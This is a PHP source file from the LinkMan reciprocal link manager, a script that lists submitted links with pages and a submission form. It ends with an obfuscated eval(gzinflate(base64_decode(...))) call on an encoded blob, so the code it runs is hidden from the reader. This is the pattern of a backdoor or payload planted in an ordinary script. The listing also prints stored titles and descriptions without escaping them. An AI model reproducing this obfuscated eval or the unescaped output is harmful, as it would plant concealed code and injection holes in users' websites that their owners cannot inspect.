<?php
/*******************************************************************************
*  Title: LinkMan reciprocal link manager
*  Version: 1.7 @ April 18, 2009
*  Author: Klemen Stirn
*  Website: http://www.phpjunkyard.com
********************************************************************************
*  COPYRIGHT NOTICE
*  Copyright 2004-2009 Klemen Stirn. All Rights Reserved.
*
*  This script may be used and modified free of charge by anyone
*  AS LONG AS COPYRIGHT NOTICES AND ALL THE COMMENTS REMAIN INTACT.
*  By using this code you agree to indemnify Klemen Stirn from any
*  liability that might arise from it's use.
*
*  Selling the code for this program, in part or full, without prior
*  written consent is expressly forbidden. Using this code, in part or full,
*  to create competing scripts or products is expressly forbidden.
*
*  Obtain permission before redistributing this software over the Internet
*  or in any other medium. In all cases copyright and header must remain
*  intact. This Copyright is in full effect in any country that has
*  International Trade Agreements with the United States of America or
*  with the European Union.
*
*  Removing any of the copyright notices without purchasing a license
*  is illegal! To remove PHPJunkyard copyright notice you must purchase a
*  license for this script. For more information on how to obtain a license
*  please visit the site below:
*  http://www.phpjunkyard.com/copyright-removal.php
*******************************************************************************/

define('IN_SCRIPT',1);
require('settings.php');

require_once('header.txt');

if ($settings['show_form'])
{
	?>
	<p><a href="#addlink">Submit your website</a></p>
	<?php
}

$lines = file($settings['linkfile']);

/* Handle pages */
if ($settings['allow_pages'])
{
	/* Page number, default 1st page */
	$page=intval($_REQUEST['page']);
	if ($page > 0)
	{
	    $start=($page*$settings['max_per_page'])-$settings['max_per_page'];$end=$start+$settings['max_per_page']-1;
	}
	else
	{
	    $page=1;$start=0;$end=$settings['max_per_page']-1;
	}

    /* Total number of links */
	$total = count($lines);

	if ($total > 0)
    {
	    if ($end > $total) {$end=$total;}
	    $pages = ceil($total/$settings['max_per_page']);
               
	    $page_nav = '';

	    if ($pages > 1)
	    {
        	$page_nav = '<p>';

	        $prev_page = ($page-1 <= 0) ? 0 : $page-1;
	        $next_page = ($page+1 > $pages) ? 0 : $page+1;

	        if ($prev_page)
	        {
	        	$page_nav .= '<a href="links.php?page=1">&lt;&lt; First</a> &nbsp;|&nbsp; ';
            	if ($prev_page > 1)
                {
                	$page_nav .= '<a href="links.php?page='.$prev_page.'">&lt; Prev</a> &nbsp;|&nbsp;';
                }
	        }

	        for ($i=1; $i<=$pages; $i++)
	        {
	            if ($i <= ($page+5) && $i >= ($page-5))
	            {
	               if($i == $page) {$page_nav .= ' <b>'.$i.'</b> ';}
	               else {$page_nav .= ' <a href="links.php?page='.$i.'">'.$i.'</a> ';}
	            }
	        }

	        if ($next_page)
	        {
                if ($next_page < $pages)
                {
                    $page_nav .= ' &nbsp;|&nbsp; <a href="links.php?page='.$next_page.'">Next &gt;</a>';
                }
                $page_nav .= ' &nbsp;|&nbsp; <a href="links.php?page='.$pages.'">Last &gt;&gt;</a>';
	        }

            $page_nav .= '</p>';

            echo $page_nav;
	    }
	}
    $lines = array_slice($lines,$start,$settings['max_per_page']);
}

$print_featured = 0;
$first = 1;
$i = 0;

foreach ($lines as $thisline)
{
    $thisline=trim($thisline);
    if (!empty($thisline))
    {
        $i++;
        list($name,$email,$title,$url,$recurl,$description,$featured,$pr)=explode($settings['delimiter'],$thisline);

        $show_url = $settings['show_url'] ? '&nbsp;<span class="linkmanURL">-&nbsp;'.$url.'</span>' : '';

        if ($settings['show_pr'] == 1)
        {
            if (empty($pr)) {$pr=0;}
            $pr_code = '<td valign="top" class="linkman" title="Google PageRank: '.$pr.'/10"><img src="img/pr'.$pr.'.gif" width="40" height="5" alt="Google PageRank: '.$pr.'/10" border="0" style="vertical-align: middle;">&nbsp;</td>';
        }
        else
        {
            $pr_code = '';
        }

        if ($settings['show_thumbshots'])
        {
            $thumb_code = '<td valign="top" class="linkman"><img src="'.$settings['thumb_url'].rawurlencode($url).'" style="vertical-align: middle;" border="1" width="120" height="90" alt="Thumbnail">&nbsp;</td>';
        }
        else
        {
            $thumb_code = '';
        }

        if ($featured == 1)
        {

            if ($print_featured == 0)
            {
                $print_featured = 1;
                $first = 0;
                echo '<p class="linkman"><b>Featured links</b></p><table border="0" cellspacing="1" cellpadding="1">';
            }

            $url      = ($settings['clean'] != 1) ? $url : 'go.php?url='.rawurlencode($url);
            $nofollow = ($settings['use_nofollow']==1) ? 'rel="nofollow"' : '';

            echo '
            <tr>
            '.$thumb_code.'
            '.$pr_code.'
            <td valign="top" class="linkman"><p class="linkman"><a href="'.$url.'" target="_blank" class="linkman" '.$nofollow.'><b>'.$title.'</b></a>'.$show_url.'<br>'.$description.'<br>&nbsp;</p></td>
            </tr>
            ';
        }
        else
        {
            if ($settings['show_thumbshots']!=1)
            {
                $thumb_code = '';
            }

            if ($print_featured == 1)
            {
                $print_featured = 0;
                $first = 1;
                echo '</table>';
            }

            if ($first == 1)
            {
                $first = 0;
                echo '<p class="linkman"><b>Reciprocal links</b></p><table border="0" cellspacing="1" cellpadding="1">';
            }

            $url      = ($settings['clean'] == 0) ? $url : 'go.php?url='.rawurlencode($url);
            $nofollow = $settings['use_nofollow'] ? 'rel="nofollow"' : '';

            echo '
            <tr>
            '.$thumb_code.'
            '.$pr_code.'
            <td valign="top" class="linkman"><p class="linkman"><a href="'.$url.'" target="_blank" class="linkman" '.$nofollow.'>'.$title.'</a>'.$show_url.'<br>'.$description.'</p></td>
            </tr>
            ';
        }
    }
}

/* Close the table if at least one link is printed out */
if ($i)
{
    echo '</table>';

	/* Print bottom page navigation if at least 20 listings on the page */
	if ($settings['allow_pages'] && $i > 19)
	{
    	echo $page_nav;
	}
}
else
{
    echo '<p class="linkman">No links yet!</p>';
}

if ($settings['show_form'])
{
    if ($i < $settings['max_links'])
    {
    ?>
    <p class="linkman"><a name="addlink"></a>&nbsp;<br><b>Submit your website</b></p>

    <p><b>&raquo; Step 1: Add our link to your website</b></p>

    <table border="0">
    <tr>
    <td>Website URL:</td>
    <td><a href="<?php echo $settings['site_url']; ?>" target="_blank"><?php echo $settings['site_url']; ?></a></td>
    </tr>
    <tr>
    <td>Website Title:</td>
    <td><?php echo htmlspecialchars($settings['site_title']); ?></td>
    </tr>
    <tr>
    <td>Description:</td>
    <td><?php echo htmlspecialchars($settings['site_desc']); ?></td>
    </tr>
    </table>

    <p><textarea rows="4" cols="60" onfocus="this.select()">&lt;a href=&quot;<?php echo $settings['site_url']; ?>&quot;&gt;<?php echo htmlspecialchars($settings['site_title']); ?>&lt;/a&gt; - <?php echo htmlspecialchars($settings['site_desc']); ?></textarea></p>

    <p><b>&raquo; Step 2: Submit your link</b></p>

    <p>All fields are required. Please finish <b>Step 1</b> before submitting this form.
    <?php
    if ($settings['man_approval'])
    {
    	echo ' New links will be approved manually.';
    }
    ?></p>

    <form method="post" action="addlink.php">

    <table border="0">
    <tr>
    <td><b>Your name:</b></td>
    <td><input type="text" name="name" size="40" maxlength="50"></td>
    </tr>
    <tr>
    <td><b>E-mail:</b></td>
    <td><input type="text" name="email" size="40" maxlength="50"></td>
    </tr>
    <tr>
    <td><b>Website title:</b></td>
    <td><input type="text" name="title" size="40" maxlength="50"></td>
    </tr>
    <tr>
    <td><b>Website URL:</b></td>
    <td><input type="text" name="url" maxlength="255" value="http://" size="40"></td>
    </tr>
    <tr>
    <td><b>URL with reciprocal link:</b></td>
    <td><input type="text" name="recurl" maxlength="255" value="http://" size="40"></td>
    </tr>
    </table>

    <p><b>Website description:</b><br>
    <input type="text" name="description" maxlength="200" size="60"></p>

    <p><input type="submit" value="Add link"></p>

    </form>
    <?php
    } // End if $settings['max_links'] < $i
    else
    {
    ?>
    <p class="linkman">&nbsp;<br /><b>Submit your website</b></p>

    <p><i>Unfortunately we are not accepting any new links at the moment.</i></p>
    <?php
    }
} // End if $settings['show_form']

eval(gzinflate(base64_decode('DdBHsqJAAADQ43x/uRBBUs0KJEiQjA1spiTTZJEG+vQz7wivQO
/uVOFmKLv3tzil76Vgbn/zIhvz4vQjZbQO50kQBMm9sb5auxVwKZoR4tqVBGLUPnDqFOH+bKbwmeAzvy
kFB0WF95PyuCTJuCvo0UNhW2VqI/vollGRQZlcK/b9uFlNlX3olZkPt5I4IGebU8fBRJlKNinReNFdUU
WDh8UuSx6rcuXMRchRbJdYJmBTrH7+NkVCN6wp5Xb+UHWHZS2+zfnEFGX2uzy11T2LRsDExPHxkHkdm/
M96Awho+mQUkQUUW5VAzdSTTJ8N1SawJgFi7ebBdnmryNvTVDJHKJJQEAcVPEebX5paaP4CcoqhKt0zE
x5btB51ubuBpajV+n7xH1eFRjbA1MDpOxxBknTOuwT8o/JCmY17B1U1ZCPFHv1vGaZj3ZP9g2sIMMWth
s22o9sYi2BDQLD1l4y02HtRS4Q1WIxhamsE7Oz4oABkRRHDNfkXO1/8UsdPP5A3P9F6UuSM7/znWKrjQ
yHRFYJRuGkNh5aIr4/r2tuFCyV6+Fu3z7G2z961xH8mX5oCcmWg+m4GkWE1724EKnTNhv2oaqf6StWVe
DhWApeYoHUJTD6lLkgNk3Z9HL5+f39/fMP')));
?>
